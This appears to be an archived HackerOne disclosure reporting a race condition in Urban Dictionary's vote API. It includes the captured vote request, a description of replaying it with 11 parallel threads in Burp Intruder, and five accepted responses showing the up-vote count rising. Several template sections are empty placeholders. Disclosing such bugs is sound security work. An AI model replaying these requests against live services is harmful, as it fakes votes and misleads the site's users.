# Race condition in up voting and down voting

## Metadata
- **Source:** HackerOne
- **Report:** 183837 | https://hackerone.com/reports/183837
- **Submitted:** 2016-11-21
- **Reporter:** flashdisk
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Violation of Secure Design Principles
- **CVEs:** None
- **Category:** business-logic

## Summary
Hi,

I want to report an issue that I have found on http://www.urbandictionary.com/
when a user wants to up vote or down vote a term he simply presses on the up or down button.
each user can up vote or down vote a term only once, but I have found that if a parallel threads do the process of up voting then multiple requests will be accepted.

**POC**

I entered the following term url: http://www.ur

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,

I want to report an issue that I have found on http://www.urbandictionary.com/
when a user wants to up vote or down vote a term he simply presses on the up or down button.
each user can up vote or down vote a term only once, but I have found that if a parallel threads do the process of up voting then multiple requests will be accepted.

**POC**

I entered the following term url: http://www.urbandictionary.com/define.php?term=alicia
intercepted the request using burp suite and sent it to intruder and set the number of threads to be 11 then started the requests which has the following:

GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
Host: api.urbandictionary.com
Cache-Control: max-age=0
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://www.urbandictionary.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Referer: http://www.urbandictionary.com/define.php?term=alicia
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Connection: close

as a response I got the following responses:

HTTP/1.1 200 OK
Connection: close
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: http://www.urbandictionary.com
X-License: http://api.urbandictionary.com/
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Aleph/0.4.1
Date: Mon, 21 Nov 2016 17:24:35 GMT
Via: 1.1 vegur
Content-Length: 40

{"status":"saved","up":6429,"down":1798}

HTTP/1.1 200 OK
Connection: close
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: http://www.urbandictionary.com
X-License: http://api.urbandictionary.com/
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Aleph/0.4.1
Date: Mon, 21 Nov 2016 17:24:35 GMT
Via: 1.1 vegur
Content-Length: 40

{"status":"saved","up":6430,"down":1797}


HTTP/1.1 200 OK
Connection: close
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: http://www.urbandictionary.com
X-License: http://api.urbandictionary.com/
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Aleph/0.4.1
Date: Mon, 21 Nov 2016 17:24:35 GMT
Via: 1.1 vegur
Content-Length: 40

{"status":"saved","up":6431,"down":1796}

HTTP/1.1 200 OK
Connection: close
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: http://www.urbandictionary.com
X-License: http://api.urbandictionary.com/
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Aleph/0.4.1
Date: Mon, 21 Nov 2016 17:24:36 GMT
Via: 1.1 vegur
Content-Length: 40

{"status":"saved","up":6432,"down":1795}

HTTP/1.1 200 OK
Connection: close
Access-Control-Allow-Methods: GET
Access-Control-Allow-Origin: http://www.urbandictionary.com
X-License: http://api.urbandictionary.com/
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Aleph/0.4.1
Date: Mon, 21 Nov 2016 17:24:36 GMT
Via: 1.1 vegur
Content-Length: 40

{"status":"saved","up":6433,"down":1795}

which means I can up vote more than once and of course the same applies for down voting which can mislead users and creates fake reputation for the terms created.

thanks. 





</details>

---
*Analysed by Claude on 2026-05-24*
